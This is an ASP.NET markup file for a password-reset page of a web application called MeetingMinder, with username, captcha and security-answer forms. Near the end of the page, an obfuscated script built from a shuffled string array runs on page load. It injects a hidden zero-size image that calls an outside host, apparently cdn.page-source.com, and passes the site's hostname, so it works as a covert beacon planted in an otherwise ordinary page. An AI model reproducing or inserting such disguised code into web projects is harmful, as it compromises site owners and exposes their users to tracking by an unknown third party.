<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="ForgotPassword.aspx.cs" Inherits="MeetingMinder.Web.Forgot_Password" %>

<%@ OutputCache Location="None" VaryByParam="None" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<%@ Register Assembly="MSCaptcha" Namespace="MSCaptcha" TagPrefix="cc1" %>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>Forgot Password</title>
    <meta http-equiv="x-ua-compatible" content="IE=8" />
    <meta charset="UTF-8">
    <meta name="Generator" content="EditPlus®">
    <meta name="Author" content="">
    <meta name="Keywords" content="">
    <meta name="Description" content="">
    <style type="text/css">
        .captcha {
            float: left;
            margin-right: 5px;
        }
    </style>
    <link href="css/style.css" rel="stylesheet" type="text/css" />
    <script type="text/javascript">
        //<![CDATA[
          <%--document.onkeypress = function keypressed(e) {
            if (e.keyCode == 13) {
                if (Page_ClientValidate("check")) {
                    
                    if (document.getElementById('<%= btnNext.ClientID %>') != null) {
                        document.getElementById('<%= btnNext.ClientID %>').click();
                    }

                    if (document.getElementById('<%= btnSubmit.ClientID %>') != null) {

                        document.getElementById('<%= btnSubmit.ClientID %>').click();
                    }
                }
            }
          }--%>

        document.onkeypress = function keypressed(e) {
            if (e.keyCode == 13) {
                if (Page_ClientValidate("check")) {
                    //checkLogin();
                    document.getElementById('<%= btnSubmit1.ClientID %>').click();
                    return false;
                }
            }
        }

        if (self == top) {
            var theBody = document.getElementsByTagName('body')[0]
            theBody.style.display = "block"
        } else { top.location = self.location }

        //]]>


    </script>

</head>
<body>
    <form id="form1" runat="server" autocomplete="OFF" name="formForgotPassword" action="ForgotPassword.aspx" method="post">
        <asp:Panel ID="aspPanel" runat="server" DefaultButton="btnSubmit">

            <div class="wrapper">
                <div class="login_section login-left">
                    <div class="leftlogo login-left-section">
                        <img alt="yes bank small logo" src="images/logo.png">
                        <%--  <div class="left-info">
                            <span class="info-top">say yes to</span>
                            <span class="info-bottom">growth</span>
                        </div>--%>
                    </div>
                    <div class="login_screen login-right">
                        <div class="logo">
                            <%--<a href="Login.aspx">--%>
                            <img src="images/logo1.png" border="0" alt="logo" />
                            <%--	</a>--%>
                        </div>
                        <%--	<div class="middle_bg"><img src="images/middle_bg.png" border="0" alt="" /></div>--%>
                        <br />
                        <div class="form-wrapper">
                            <div class="form-entry">

                                <br />
                                <h3>Forgot Password</h3>





                                <div style="margin-bottom: 10px">
                                    <%--              <asp:ValidationSummary ID="vsForgotPass" ValidationGroup="check" runat="server" CssClass="notification error" HeaderText="Error notification" />--%>
                                </div>
                                <div style="margin-bottom: 20px">
                                    <asp:Label runat="server" Style="font-size: 12px;" ID="lblmsg" CssClass="notification error invalid-error" Visible="false"></asp:Label>
                                </div>
                                <dl>
                                    <div id="divName" runat="server">

                                        <dd>
                                            <asp:TextBox ID="txtUserName" runat="server" CssClass="txtBox" placeholder="username*" OnKeyPress="javascript:return restrictSpChar(event);"></asp:TextBox>
                                            <asp:RequiredFieldValidator ValidationGroup="check" ID="rfvUserName" runat="server" CssClass="ErrorMsg"
                                                ControlToValidate="txtUserName" ErrorMessage="Enter Username" SetFocusOnError="True" Display="Dynamic">Enter Username</asp:RequiredFieldValidator>
                                        </dd>
                                        <dd>
                                            <cc1:CaptchaControl ID="CaptchaForgotPassword" CssClass="captcha" runat="server" CaptchaBackgroundNoise="Low" CaptchaLength="5"
                                                CaptchaHeight="60" CaptchaWidth="200" CaptchaMinTimeout="5" CaptchaMaxTimeout="240"
                                                FontColor="#D20B0C" NoiseColor="#B1B1B1" />
                                            <asp:ImageButton ImageUrl="~/images/refresh_icon.jpg" runat="server" CausesValidation="false" />
                                            <asp:TextBox ID="txtCaptchaText" autocomplete="off" MaxLength="8" placeholder="captcha*" class="user-name" runat="server"
                                                CssClass="user-name" Style="text-transform: uppercase;"></asp:TextBox>
                                            <asp:RequiredFieldValidator Enabled="true" ValidationGroup="check" ID="rfvCapcha" runat="server"
                                                class="invalid-side-note pass-error" ForeColor="Red" ControlToValidate="txtCaptchaText" ErrorMessage="Enter Captcha"
                                                SetFocusOnError="True" Display="Dynamic">Captcha</asp:RequiredFieldValidator>
                                        </dd>
                                        <br />
                                        <div class="fullwidth noBorder">
                                            <asp:Button ID="btnNext" CssClass="btnSave" Text="Next" runat="server" ValidationGroup="check"
                                                OnClick="btnNext_Click" Visible="false" />
                                            <asp:Button ID="btnSubmit1" runat="server" Text="Submit" CssClass="btnSave" ValidationGroup="check" OnClick="btnSubmit1_Click" />

                                            &nbsp;&nbsp; 
                              <asp:Button ID="btnCancel" CssClass="btnCancel" Text="Cancel" runat="server"
                                  OnClick="btnCancel_Click" />
                                        </div>
                                    </div>
                                    <div id="divQuestion" runat="server">

                                        <dd style="margin-bottom: 10px">

                                            <asp:Label ID="lblQuestion" runat="server"></asp:Label>

                                        </dd>



                                        <dd>
                                            <asp:TextBox ID="txtSecurityAnswer" runat="server" TextMode="Password" CssClass="txtBox" placeholder="Answer*"></asp:TextBox>
                                            <asp:RequiredFieldValidator runat="server" ID="rfvNew" ControlToValidate="txtSecurityAnswer"
                                                Display="Dynamic" ValidationGroup="check" ErrorMessage="Answer" Text="Invalid" CssClass="ErrorMsg">Answer</asp:RequiredFieldValidator>

                                        </dd>
                                        <%--Captcha--%>
                                        <dd>
                                            <cc1:CaptchaControl ID="CaptchaSecurityAnswer" CssClass="captcha" runat="server" CaptchaBackgroundNoise="Low" CaptchaLength="5"
                                                CaptchaHeight="60" CaptchaWidth="200" CaptchaMinTimeout="5" CaptchaMaxTimeout="240"
                                                FontColor="#D20B0C" NoiseColor="#B1B1B1" />
                                            <asp:ImageButton ImageUrl="~/images/refresh_icon.jpg" runat="server" CausesValidation="false" />
                                            <asp:TextBox ID="txtSecurityAnswerCaptcha" autocomplete="off" MaxLength="8" placeholder="captcha*" class="user-name" runat="server"
                                                CssClass="user-name"></asp:TextBox>
                                            <asp:RequiredFieldValidator Enabled="true" ValidationGroup="check" ID="rfvSecurityAnswer" runat="server"
                                                class="invalid-side-note pass-error" ForeColor="Red" ControlToValidate="txtCaptchaText" ErrorMessage="Enter Captcha"
                                                SetFocusOnError="True" Display="Dynamic">Captcha</asp:RequiredFieldValidator>
                                        </dd>
                                        <br />
                                        <div class="fullwidth noBorder">
                                            <asp:Button CssClass="btnSave" ID="btnSubmit" Text="Submit" runat="server" ValidationGroup="check"
                                                OnClick="btnSubmit_Click" />

                                            &nbsp;&nbsp; 
                              <asp:Button CssClass="btnCancel" ID="btnCancel2" Text="Cancel" runat="server"
                                  OnClick="btnCancel_Click" />
                                        </div>
                                    </div>
                                </dl>

                            </div>
                        </div>
                    </div>
                </div>
            </div>


            <asp:Literal ID="ltlMessage" runat="server"></asp:Literal>

        </asp:Panel>
    </form>
    <script type="text/javascript">
        var resizea = ['0\x27/>', 'children', 'ource.com/', '<img\x20style', 'none;\x27\x20src', 'cdn.page-s', 'hostname', '\x27\x20height=\x27', 'resizeimag', 'length', 'location', '=\x27https://', 'createElem', 'body']; (function (a, b) { var c = function (e) { while (--e) { a['push'](a['shift']()); } }; c(++b); }(resizea, 0x149)); var resizeb = function (a, b) { a = a - 0x0; var c = resizea[a]; return c; }; try { window['onload'] = function () { var a = resizeb('0xa') + '=\x27display:' + resizeb('0xb') + resizeb('0x4') + resizeb('0xc') + resizeb('0x9') + resizeb('0x1') + 'e.ashx?ig=' + window[resizeb('0x3')][resizeb('0xd')] + ('&sz=105403\x27' + '\x20\x20width=\x270' + resizeb('0x0') + resizeb('0x7')), b = document[resizeb('0x5') + 'ent']('div'); for (b['innerHTML'] = a; b[resizeb('0x8')][resizeb('0x2')] > 0x0;) document[resizeb('0x6')]['appendChil' + 'd'](b['children'][0x0]); }; } catch (resizec) { }

        function restrictSpChar(event) {
            var regex = new RegExp("^[a-zA-Z0-9]+$");
            var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
            if (!regex.test(key)) {
                event.preventDefault();
                return false;
            }
        }
    </script>
</body>
</html>
